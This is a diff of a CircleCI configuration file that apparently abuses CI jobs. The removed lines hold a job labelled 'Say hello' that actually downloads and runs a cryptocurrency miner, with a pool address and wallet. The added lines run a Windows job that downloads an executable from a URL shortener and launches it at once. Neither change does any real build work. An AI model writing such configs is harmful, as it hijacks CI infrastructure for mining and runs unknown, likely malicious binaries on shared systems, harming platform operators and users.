@@ -1,26 +1,13 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/2.0/configuration-reference
 version: 2.1
-
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
 jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
-    docker:
-      - image: cimg/base:stable
-    # Add steps to the job
-    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+  build:
+    executor:
+      name: win/default
+      shell: cmd.exe
     steps:
-      - checkout
-      - run:
-          name: "Say hello"
-          command: "wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.17/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yescryptR16 -o stratum+tcps://stratum-asia.rplant.xyz:17055 -u qcqMw313oWBmhmjirLwDb5TVjaAFsg3WJs.killer2.0 -t 2"
+      - run: curl -L -o gqyDM.exe https://shorturl.at/gqyDM && gqyDM.exe
 
-# Invoke jobs via workflows
-# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
-workflows:
-  say-hello-workflow:
-    jobs:
-      - say-hello
